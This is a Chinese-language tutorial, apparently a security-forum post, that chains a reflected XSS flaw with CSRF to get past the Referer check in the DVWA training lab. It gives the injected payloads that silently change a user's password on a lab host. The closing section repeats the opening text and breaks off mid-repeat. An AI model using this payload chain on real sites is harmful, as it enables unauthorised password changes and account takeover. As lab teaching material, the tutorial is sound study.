@@ -1,0 +1,110 @@
+
+# [原创]CSRF+XSS突破DVWA靶场中等安全防护
+
+在DVWA靶场突破CSRF中级防护要比初级防护难得多。在中级防护下，服务端对以GET方式提交的参数处理之前，首先进行Referer验证，保证链接来自于可信的域。
+
+```php
+if( isset( $_GET['Change'] ) ) {
+
+    // Checks to see where the request came from
+
+    if( stripos( $_SERVER['HTTP_REFERER'] ,$_SERVER['SERVER_NAME'] ) !== false ) {
+
+        // Get input
+
+        $pass_new  = $_GET['password_new'];
+
+        $pass_conf = $_GET['password_conf'];
+```
+
+在这种防护下，直接采用突破初级防护的方式，即直接在URL栏中输入链接<mark class="encrypted">364K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0t1K6y4g2)9J5k6e0p5J5z5q4)9J5c8V1c8h3g2@1q4Q4x3V1k6$3N6h3I4F1k6i4u0S2j5X3W2D9K9i4c8A6k6i4y4Q4x3V1k6U0M7%4u0X3i4K6u0r3i4K6y4r3M7r3q4K6M7%4N6G2M7X3c8Q4y4h3k6F1k6i4N6Q4x3@1b7I4i4K6t1$3M7r3q4K6M7%4N6G2M7X3c8Q4y4h3k6U0L8$3&6X3i4K6y4p5x3g2)9J5y4V1y4Z5j5h3&6Y4k6g2)9K6c8p5y4Z5j5h3&6Y4k6g2)9J5x3#2!0q4y4g2!0n7y4#2!0n7x3W2!0q4y4#2!0n7b7W2)9^5c8W2!0q4y4q4!0n7z5q4)9^5c8q4!0q4z5q4!0n7y4g2!0n7y4#2!0q4y4q4!0n7c8q4)9&6b7#2!0q4y4#2)9&6y4q4!0m8z5q4!0q4x3#2)9^5x3q4)9^5x3W2!0q4z5g2)9^5x3q4)9&6b7g2!0q4z5q4!0n7c8W2)9^5y4#2!0q4y4q4!0n7c8q4!0n7c8W2!0q4y4#2)9&6y4q4!0m8z5r3u0#2M7Y4m8Q4c8e0k6Q4z5p5u0Q4b7e0k6Q4c8e0k6Q4z5o6S2Q4b7f1q4g2f1V1I4Q4c8e0k6Q4z5p5k6Q4z5e0m8Q4c8e0c8Q4b7V1q4Q4b7e0c8Q4c8e0S2Q4b7V1k6Q4z5o6N6Q4c8e0N6Q4b7e0S2Q4z5p5u0Q4c8e0g2Q4z5p5k6Q4b7f1k6Q4c8e0c8Q4b7V1u0Q4b7e0g2Q4c8e0N6Q4z5f1y4Q4z5p5u0Q4c8e0g2Q4z5o6S2Q4b7U0m8Q4c8f1k6Q4b7V1y4Q4z5p5y4Q4c8e0N6Q4z5f1u0Q4b7U0c8Q4c8e0k6Q4z5p5g2Q4b7e0g2Q4c8e0g2Q4z5f1y4Q4b7e0S2g2f1V1I4Q4c8e0k6Q4b7e0m8Q4z5p5k6Q4c8e0c8Q4b7U0S2Q4b7f1c8Q4c8e0S2Q4b7V1g2Q4z5e0y4Q4c8e0g2Q4z5o6g2Q4b7e0g2Q4c8e0W2Q4z5e0y4Q4b7V1g2Q4c8e0k6Q4z5p5g2Q4b7e0g2Q4c8e0N6Q4z5f1q4Q4z5o6c8Q4c8e0k6Q4z5e0k6Q4b7U0W2Q4c8e0g2Q4b7V1y4Q4z5p5k6Q4c8f1k6Q4b7V1y4Q4z5p5y4Q4c8e0k6Q4z5p5k6Q4z5e0m8Q4c8e0c8Q4b7V1q4Q4b7e0c8Q4c8e0N6Q4b7V1u0Q4z5e0W2Q4c8e0k6Q4z5f1y4Q4z5p5c8Q4c8e0g2Q4z5p5q4Q4b7e0q4Q4c8e0g2Q4z5e0W2Q4b7e0S2Q4c8e0N6Q4z5f1q4Q4z5o6c8Z5N6s2c8H3i4@1f1#2i4@1p5@1i4@1t1@1i4@1f1@1i4@1t1^5i4@1q4p5i4@1f1%4i4@1u0o6i4@1u0m8i4@1f1#2i4@1t1H3i4K6V1I4f1X3g2X3k6i4u0W2M7W2!0q4c8W2!0n7b7#2)9&6b7b7`.`.</mark>
+
+![](upload/attach/202011/717768_NKYWPG9R5KAJ33C.jpg)
+
+导致服务端调用`stripos( $_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME'] )`返回false，后续修改密码的操作无法执行。那么怎么突破呢？既然服务器端有Referer验证，那么考虑在http请求中增加Referer字段。通过burp拦截http请求，增加Referer头：
+
+![](upload/attach/202011/717768_JCJ5468JFR8EQ7U.jpg)
+
+重新发送链接，密码成功修改：
+
+![](upload/attach/202011/717768_GRH4MC4PWVNFTWS.jpg)
+
+以上验证了该思路突破服务端验证机制的可行性。实际中，需要用户点击来历不明的链接以达到悄悄修改密码的目的，需要更加实用的突破方式，即在不使用代理的情况下，如何增加Referer头？
+
+上面通过代理增加Referer头，实际上当我们从一个页面访问另一个页面时，http请求中会自动增加Referer字段，那么我们能不能用两个在同一域上的页面按照一定的访问次序来达到突破Referer验证的目的？比如，我们访问一个同一域上有xss漏洞的页面，在访问请求url中注入代码，注入的代码中含有对csrf漏洞页面的访问，那么在访问csrf漏洞页面时，由于是从同一域上含有xss的页面中跳转而来，那么http请求头中自然含有Referer字段，而且是同一个域，那么自然就突破了服务端对Referer的验证。
+
+访问含有xss漏洞的页面的URL：<mark class="encrypted">617K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0t1K6y4g2)9J5k6e0p5J5z5q4)9J5c8V1c8h3g2@1q4Q4x3V1k6$3N6h3I4F1k6i4u0S2j5X3W2D9K9i4c8A6k6i4y4Q4x3V1k6^5M7%4y4Q4y4h3k6J5i4K6u0r3i4K6y4r3L8X3q4E0k6g2)9K6c8r3S2W2k6h3H3`.</mark>
+
+```
+<img
+
+%20src=1%20onerror=alert("xss")%20/>
+```
+
+目的页面URL：
+
+<mark class="encrypted">111K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0t1K6y4g2)9J5k6e0p5J5z5q4)9J5c8V1c8h3g2@1q4Q4x3V1k6$3N6h3I4F1k6i4u0S2j5X3W2D9K9i4c8A6k6i4y4Q4x3V1k6U0M7%4u0X3i4K6u0r3i4K6y4r3</mark>
+
+`password_new=2&password_conf=2&Change=Change#`
+
+构建一个新的URL：
+
+<mark class="encrypted">010K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0t1K6y4g2)9J5k6e0p5J5z5q4)9J5c8V1c8h3g2@1q4Q4x3V1k6$3N6h3I4F1k6i4u0S2j5X3W2D9K9i4c8A6k6i4y4Q4x3V1k6^5M7%4y4Q4y4h3k6J5i4K6u0r3i4K6y4r3L8X3q4E0k6g2)9K6c8r3S2W2k6b7`.`.</mark>
+
+```
+</pre><img src=="http://192.168.235.128/DVWA/vulnerabilities/csrf/?password_new=3&password_conf=3&Change=Change"><pre>
+```
+
+其中的`</pre>`、`<pre>`为了闭合前面的`<pre>`与`</pre>`。
+
+使用burp拦截，服务器返回响应如下：
+
+```
+<pre>Hello hee </pre><img src="http://192.168.235.128/DVWA/vulnerabilities/csrf/?password_new=3</pre>
+```
+
+可以看到，`password_new=3&password_conf=3&Change=Change`已经被截取，只保留第一部分。
+
+对`&`和`#`分别用`%26`、`%23`进行URL编码，构建链接
+
+<mark class="encrypted">358K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0t1K6y4g2)9J5k6e0p5J5z5q4)9J5c8V1c8h3g2@1q4Q4x3V1k6$3N6h3I4F1k6i4u0S2j5X3W2D9K9i4c8A6k6i4y4Q4x3V1k6^5M7%4y4Q4y4h3k6J5i4K6u0r3i4K6y4r3L8X3q4E0k6g2)9K6c8r3S2W2k6b7`.`.</mark>
+
+```
+%20</pre><img%20src="http://192.168.235.128/DVWA/vulnerabilities/csrf/?password_new=3%26password_conf=3%26Change=Change%23"><pre>
+```
+
+得到响应`<pre>Hello hee </pre><img src="http://192.168.235.128/DVWA/vulnerabilities/csrf/?password_new=3&password_conf=3&Change=Change#"><pre></pre>`，如图：
+
+![](upload/attach/202011/717768_RM53ED56QCRV869.jpg)
+
+推测链接<mark class="encrypted">766K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0t1K6y4g2)9J5k6e0p5J5z5q4)9J5c8V1c8h3g2@1q4Q4x3V1k6$3N6h3I4F1k6i4u0S2j5X3W2D9K9i4c8A6k6i4y4Q4x3V1k6U0M7%4u0X3i4K6u0r3i4K6y4r3M7r3q4K6M7%4N6G2M7X3c8Q4y4h3k6F1k6i4N6Q4x3@1b7K6i4K6t1$3M7r3q4K6M7%4N6G2M7X3c8Q4y4h3k6U0L8$3&6X3i4K6y4p5x3#2)9J5y4V1y4Z5j5h3&6Y4k6g2)9K6c8p5y4Z5j5h3&6Y4k6g2)9J5x3#2!0q4y4g2!0n7b7g2)9&6y4q4!0q4z5q4!0m8c8W2!0m8y4g2!0q4y4W2)9^5z5q4)9&6x3q4!0q4y4g2)9^5b7g2)9&6c8W2!0q4y4g2)9^5c8W2)9&6x3g2!0q4z5q4!0n7y4g2!0n7y4#2!0q4y4q4!0n7b7g2)9^5y4W2!0q4z5q4!0m8c8g2!0n7c8W2!0q4z5g2)9&6y4#2!0m8c8g2!0q4z5q4!0m8c8W2!0n7y4#2!0q4y4W2!0n7x3g2)9^5x3W2!0q4c8W2!0n7b7#2)9^5b7#2!0q4y4g2!0m8c8W2)9^5y4W2!0q4y4#2!0m8x3q4)9^5x3g2!0q4y4g2!0n7c8g2)9&6y4#2!0q4y4g2)9^5z5q4!0n7x3q4!0q4y4q4!0n7b7g2)9^5y4W2!0q4y4q4!0n7c8W2!0m8c8g2!0q4y4W2)9&6y4q4!0n7z5g2!0q4x3#2)9^5x3q4)9^5x3R3`.`.</mark>
+
+![](upload/attach/202011/717768_8FKM6AVCSBCM3AE.jpg)
+
+将链接中设置为密码3,重新访问，然后退出系统，使用新密码可以成功登录。将链接中的密码改成你想要的密码，可以实现密码自动修改。
+
+![](upload/attach/202011/717768_KPWVYAWYST6GGPT.jpg)
+
+以上针对服务端的验证机制，采用xss与csrf漏洞相结合的思路突破了服务端通过检测Referer判断url请求是否来自信任域的保护机制。实际中一个漏洞的作用有限，往往需要利用多个漏洞才能达到突破系统的目的。
+
+在DVWA靶场突破CSRF中级防护要比初级防护难得多。在中级防护下，服务端对以GET方式提交的参数处理之前，首先进行Referer验证，保证链接来自于可信的域。
+
+```php
+if( isset( $_GET['Change'] ) ) {
+
+ // Checks to see where the request came from
+
+ if( stripos( $_SERVER['HTTP_REFERER'] ,$_SERVER['SERVER_NAME'] ) !== false ) {
+
+ // Get input
+
+ $pass_new = $_GET['password_new'];
+
+ $pass_conf = $_GET['password_conf'];
+```
+
+在这种防护下，直接采用突破初级防护的方式，即直接在URL栏中输入链接f26K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0t1K6y4g2)9J5k6e0p5J5z5q4)9J5c8V1c8h3g2@1q4Q4x3V1k6$3N6h3I4F1k6i4u0S2j5X3W2D9K9i4c8A6k6i4y4Q4x3V1k6U0M7%4u0X3i4K6u0r3i4K6y4r3M7r3q4K6M7%4N6G2M7X3c8Q4y4h3k6F1k6i4N6Q4x3@1b7I4i4K6t1$3j5h3#2H3i4K6y4n7M7r3q4K6M7%4N6G2M7X3c8Q4y4h3k6U0L8$3&6X3i4K6y4p5x3g2)9J5y4X3q4E0M7q4)9K6b7V1y4Z5j5h3&6Y4k6g2)9K6c8p5y4Z5j5h3&6Y4k6g2)9J5x3#2!0q4y4g2!0n7y4#2!0n7x3W2!0q4y4#2!0n7b7W2)9^5c8W2!0q4y4q4!0n7z5q4)9^5c8q4!0q4z5q4!0n7y4g2!0n7y4#2!0q4y4q4!0n7c8q4)9&6b7#2!0q4y4#2)9&6y4q4!0m8z5q4!0q4x3#2)9^5x3q4)9^5x3W2!0q4z5g2)9^5x3q4)9&6b7g2!0q4z5q4!0n7c8W2)9^5y4#2!0q4y4q4!0n7c8q4!0n7c8W2!0q4y4#2)9&6y4q4!0m8z5r3u0#2M7Y4m8Q4c8e0k6Q4z5p5u0Q4b7e0k6Q4c8e0k6Q4z5o6S2Q4b7f1q4g2f1V1I4Q4c8e0k6Q4z5p5k6Q4z5e0m8Q4c8e0c8Q4b7V1q4Q4b7e0c8Q4c8e0S2Q4b7V1k6Q4z5o6N6Q4c8e0N6Q4b7e0S2Q4z5p5u0Q4c8e0g2Q4z5p5k6Q4b7f1k6Q4c8e0c8Q4b7V1u0Q4b7e0g2Q4c8e0N6Q4z5f1y4Q4z5p5u0Q4c8e0g2Q4z5o6S2Q4b7U0m8Q4c8f1k6Q4b7V1y4Q4z5p5y4Q4c8e0N6Q4z5f1u0Q4b7U0c8Q4c8e0k6Q4z5p5g2Q4b7e0g2Q4c8e0g2Q4z5f1y4Q4b7e0S2g2f1V1I4Q4c8e0k6Q4b7e0m8Q4z5p5k6Q4c8e0c8Q4b7U0S2Q4b7f1c8Q4c8e0S2Q4b7V1g2Q4z5e0y4Q4c8e0g2Q4z5o6g2Q4b7e0g2Q4c8e0W2Q4z5e0y4Q4b7V1g2Q4c8e0k6Q4z5p5g2Q4b7e0g2Q4c8e0N6Q4z5f1q4Q4z5o6c8Q4c8e0k6Q4z5e0k6Q4b7U0W2Q4c8e0g2Q4b7V1y4Q4z5p5k6Q4c8f1k6Q4b7V1y4Q4z5p5y4Q4c8e0k6Q4z5p5k6Q4z5e0m8Q4c8e0c8Q4b7V1q4Q4b7e0c8Q4c8e0N6Q4b7V1u0Q4z5e0W2Q4c8e0k6Q4z5f1y4Q4z5p5c8Q4c8e0g2Q4z5p5q4Q4b7e0q4Q4c8e0g2Q4z5e0W2Q4b7e0S2Q4c8e0N6Q4z5f1q4Q4z5o6c8Z5N6s2c8H3i4@1f1#2i4@1p5@1i4@1t1@1i4@1f1@1i4@1t1^5i4@1q4p5i4@1f1%4i4@1u0o6i4@1u0m8i4@1f1#2i4@1t1H3i4K6V1I4f1X3g2X3k6i4u0W2M7W2!0q4c8W2!0n7b7#2)9&6b7b7`.`.
+
+![](https://bbs.kanxue.com/upload/attach/202011/717768_NKYWPG9R5KAJ33C.jpg)
+
+导致服务端调用`stripos( $_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME'] )`返回false,后续修改密码的操作无法执行。那么怎么突破呢？既然服务器端有Referer验证，那么考虑在http请求中增加Referer字段。通过burp拦截http请求，增加Referer头：
